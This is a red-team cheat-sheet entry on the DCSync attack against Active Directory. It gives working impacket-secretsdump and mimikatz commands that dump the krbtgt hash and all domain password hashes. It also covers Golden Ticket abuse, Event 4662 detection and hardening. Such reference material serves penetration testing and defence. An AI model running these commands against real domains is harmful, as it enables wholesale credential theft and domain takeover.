---
title: "DCSync"
category: "red-team"
tags: ["active-directory", "credential-access", "dcsync"]
platform: "windows"
mitre: ["T1003.006"]
difficulty: "advanced"
updated: "2026-07-11"
author: "core"
---

# DCSync

## TL;DR
Abuse the Directory Replication Service (DRSUAPI) to ask a Domain Controller to replicate account secrets — including the `krbtgt` hash — without touching LSASS or running code on the DC. Requires replication rights (Domain Admins have them by default; can be delegated).

## Requirements
```text
Rights on the domain object:
 - DS-Replication-Get-Changes
 - DS-Replication-Get-Changes-All
Held by: Domain Admins, Enterprise Admins, Domain Controllers — or delegated to any principal.
```

## Commands
```bash
# Impacket – dump specific user or the whole domain
impacket-secretsdump -just-dc-user krbtgt corp.local/administrator@10.10.10.10 -hashes :<nthash>
impacket-secretsdump -just-dc corp.local/administrator@10.10.10.10   # all domain hashes
```
```powershell
# Mimikatz
lsadump::dcsync /domain:corp.local /user:krbtgt
lsadump::dcsync /domain:corp.local /all /csv
```

## Why it matters
- The `krbtgt` hash enables **Golden Tickets** (forge any TGT) — full domain persistence.
- Any account's NT hash → Pass-the-Hash / offline crack.

## Detection (Blue Team)
```text
Event 4662 on the DC: access to the domain object with the replication GUIDs
 - {1131f6aa-...} DS-Replication-Get-Changes
 - {1131f6ad-...} DS-Replication-Get-Changes-All
Signal: replication requests from a source that is NOT a Domain Controller.
```

## Mitigation / Hardening
- Audit and minimize who holds replication rights (BloodHound "DCSync Rights").
- Alert on 4662 replication access from non-DC hosts; tier-0 protection of privileged accounts.
- Rotate `krbtgt` (twice) after any suspected compromise.

## Sources
- [MITRE T1003.006](https://attack.mitre.org/techniques/T1003/006/) · [The Hacker Recipes – DCSync](https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync)
